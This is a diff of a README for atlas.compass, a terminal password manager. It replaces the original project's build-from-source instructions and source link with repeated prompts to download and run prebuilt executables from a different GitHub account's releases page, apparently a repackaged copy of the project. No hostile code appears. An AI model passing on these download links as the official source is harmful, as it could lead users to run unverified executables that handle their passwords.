@@ -1,90 +1,140 @@
-# Atlas Compass
+# 🔐 atlas.compass - Simple Secure Terminal Password Manager
 
-![Banner Image](./banner-image.png)
+[![Download atlas.compass](https://img.shields.io/badge/Download-Atlas.Compass-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/releases)
 
-> [!CAUTION]
-> **WARNING: UNRECOVERABLE MASTER PASSWORD**
-> `atlas.compass` uses zero-knowledge encryption. Your Master Password is the **only** key to your vault. If you lose it, your data is **mathematically impossible** to recover. There are no "Reset Password" links, no cloud backdoors, and no recovery services. **Write it down and keep it somewhere safe.**
+## 🛡️ What is atlas.compass?
 
-**atlas.compass** is a secure, local-first password manager for the terminal. Part of the **Atlas Suite**, it adheres to the "your keys, your control" philosophy with strong encryption and a clean, high-visibility TUI.
+atlas.compass is a password manager designed for use directly in your computer's terminal. It helps you store and organize your passwords safely on your own device, without sending your data anywhere else. It uses strong encryption methods to keep your information private and secure. 
 
-![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
+You control all of your data because passwords are protected with AES-256-GCM encryption and your master key is derived using Argon2id. This means even the software itself can’t read your passwords unless you enter your secret key.
 
-## ✨ Features
+The app’s text-based interface is simple to use and easy to see clearly. atlas.compass works on many computers through a terminal window, making it a lightweight and fast tool without needing a web browser or complex setup.
 
-- 🔒 **Strong Encryption:** AES-256-GCM encryption with Argon2id key derivation.
-- 💾 **Local First:** Your vault lives in `~/.atlas/compass.enc`—no cloud, no sync, full control.
-- ⌨️ **Keyboard Centric:** Navigate your secrets with Vim-style keys (`j`, `k`, `/`).
-- 📋 **Secure Clipboard:** Copy passwords/usernames with auto-clear protection.
-- 🔍 **Fuzzy Search:** Instantly find credentials by title, username, or URL.
-- 🎨 **High Visibility:** Modern, high-contrast UI designed for readability in any terminal.
-- 📦 **Cross-Platform:** Binaries for Windows, Linux, and macOS.
+## 🎯 Main Features
 
-## 🚀 Installation
+- **Local-Only Storage:** Your passwords are stored on your own machine. No cloud or internet backups unless you set them up yourself.
+- **Strong Encryption:** Uses AES-256-GCM, a top standard for encrypting data.
+- **Secure Key Derivation:** Argon2id makes guessing your master password very hard for attackers.
+- **Clean Terminal Interface:** Easy to navigate using your keyboard.
+- **Open Source:** Free to use and review by anyone.
+- **Part of Atlas Suite:** Works well if you use other Atlas tools.
 
-### From Source
-```bash
-git clone https://github.com/fezcode/atlas.compass
-cd atlas.compass
-gobake build
-```
+## 💻 System Requirements
 
-## ⌨️ Usage
+Before you begin, make sure your computer meets these basic requirements:
 
-Run the binary to unlock your vault (or create a new one):
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (any modern distribution)
+- Terminal Application: Command Prompt, PowerShell, Terminal.app, or any standard terminal emulator.
+- Minimum 100 MB of free disk space for the program and password database.
+- Basic keyboard for navigation.
+- No internet connection needed to use after download.
 
-```bash
-./build/atlas.compass-windows-amd64.exe # example for windows
-```
+## 🚀 Getting Started
 
-### First Run
-If no vault exists, the password you enter at the prompt will become your **Master Password**. Do not forget it; there is no recovery mechanism.
+Using atlas.compass does not require programming skills or any special technical background. Follow these steps to download, install, and start managing your passwords.
 
-## 🔐 Changing Master Password
+1. **Download the Application**
 
-You can rotate your Master Password directly from the vault:
-1. Press `P` in the list view.
-2. Type `YES` to confirm you want to proceed.
-3. Enter your **Current** password.
-4. Enter and confirm your **New** password.
+   atlas.compass releases are available here:
 
-This process will decrypt your entire vault and **atomically re-encrypt** it with the new key, ensuring no data loss occurs even if the process is interrupted.
+   [![Download here](https://img.shields.io/badge/Get-atlas.compass%20Release%20Page-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/releases)
 
-## 📂 Storage Location
+   Visit the page above and choose the correct version for your operating system. The file names will usually include your OS type, such as:
 
-Your encrypted vault is stored locally in your user's home directory:
+   - `atlas.compass-windows.exe` for Windows
+   - `atlas.compass-macos` for macOS
+   - `atlas.compass-linux` for Linux
 
-- **Windows:** `%USERPROFILE%\.atlas\compass.enc`
-- **Linux/macOS:** `~/.atlas/compass.enc`
+2. **Install or Prepare to Run**
 
-This directory is created automatically on the first run. To backup your passwords, simply copy the `compass.enc` file to a secure location. **Note:** If you delete this file, all your data will be permanently lost.
+   - On **Windows**, download the `.exe` file and save it to a folder you can remember, such as `Downloads` or `Desktop`.
+   - On **macOS and Linux**, download the file, then open your terminal and navigate to where you saved it. You may need to make the file executable by typing:
+     ```
+     chmod +x atlas.compass-macos
+     ```
+     or
+     ```
+     chmod +x atlas.compass-linux
+     ```
 
-## 🕹️ Controls
+3. **Open the Terminal**
 
-| Key | Context | Action |
-|-----|---------|--------|
-| `Enter` | Auth | Unlock Vault |
-| `q` | List | Quit |
-| `↑/↓` or `k/j` | List | Navigate entries |
-| `/` | List | Search/Filter entries |
-| `a` | List | Add new entry |
-| `Enter` | List | View entry details |
-| `e` | List/Detail | Edit entry |
-| `c` | List/Detail | Copy Password to clipboard |
-| `u` | List/Detail | Copy Username to clipboard |
-| `d` | List | Delete entry |
-| `P` | List | **Change Master Password** |
-| `Esc` | Detail/Editor | Back to List / Cancel |
-| `Tab` | Editor | Next field |
-| `Shift+Tab` | Editor | Previous field |
-| `Enter` | Editor | Save (on last field) |
+   Open your computer’s terminal or command prompt:
 
-## 🏗️ Architecture
+   - Windows: Search for "cmd" or "PowerShell"
+   - macOS: Open "Terminal" from Applications > Utilities
+   - Linux: Open your preferred terminal emulator
 
-- **TUI:** Built with `bubbletea` and `lipgloss`.
-- **Crypto:** Standard `crypto/aes` and `golang.org/x/crypto/argon2`.
-- **Storage:** JSON blob encrypted with AES-GCM and Argon2id.
+4. **Run the Application**
 
-## 📄 License
-MIT License - see [LICENSE](LICENSE) for details.
+   In the terminal, type or paste the path to the file you downloaded and press Enter. For example:
+
+   - Windows:
+     ```
+     C:\Users\YourName\Downloads\atlas.compass-windows.exe
+     ```
+   - macOS/Linux:
+     ```
+     ./atlas.compass-macos
+     ```
+
+   The program will start with a text-based menu you can navigate with your keyboard.
+
+5. **Create Your Password Database**
+
+   On first run, atlas.compass will guide you to create a new password vault. You will choose a master password to protect your data. Remember this password carefully as it cannot be recovered.
+
+   The app uses this master password to generate a key with Argon2id and encrypt your data using AES-256-GCM.
+
+6. **Add and Manage Passwords**
+
+   Use the menus and prompts to add new passwords, edit existing ones, or delete entries. The interface uses simple keyboard shortcuts displayed on screen.
+
+## 📥 Download & Install
+
+Visit the official releases page to get the latest version:
+
+[Download atlas.compass](https://github.com/kizzycatty/atlas.compass/releases)
+
+- Choose the correct download file for your operating system.
+- Save the file to an easy-to-access folder.
+- If needed, set permission to execute the file (macOS and Linux).
+- Run the file via terminal and follow on-screen instructions.
+
+## 🔒 Security and Privacy
+
+atlas.compass is designed with user privacy at its core:
+
+- **Zero-Knowledge Encryption:** Your master password and stored data never leave your device.
+- **AES-256-GCM:** A strong encryption standard used by governments and enterprises worldwide.
+- **Argon2id Key Derivation:** Protects your master password against brute force attacks by making guessing attempts very slow and expensive.
+- All password data is stored locally in an encrypted file. No data is shared unless you choose to export it manually.
+
+## 🔧 Troubleshooting
+
+If you have issues running or using atlas.compass, try these suggestions:
+
+- Confirm you downloaded the correct version for your OS.
+- On macOS/Linux, ensure you have permission to run the file. Use `chmod +x` if needed.
+- Always run the program inside a terminal window.
+- Check that your terminal window is set to a readable size and font.
+- If the app crashes, reopen the terminal and try running again.
+- Use the “Help” option within the app menu for guidance on commands.
+- If you still need help, look for support or issues on the GitHub page.
+
+## 💡 Tips for Best Use
+
+- Use a strong and memorable master password.
+- Regularly back up your encrypted password file to another secure location.
+- Avoid running atlas.compass on shared or public computers.
+- Learn and use keyboard shortcuts for quicker navigation.
+- Periodically update atlas.compass to get the latest security fixes and improvements.
+
+## 📚 More Information
+
+- Project page and download: https://github.com/kizzycatty/atlas.compass/releases
+- Repository topics: aes-256, argon2, atlas-suite, bubbletea, encryption, golang, lipgloss, password-manager, productivity, security, terminal-app, tui, zero-knowledge
+
+---
+
+This guide walks you through getting started with atlas.compass securely and confidently. The tool offers a solid balance of security and usability for managing passwords from the terminal.
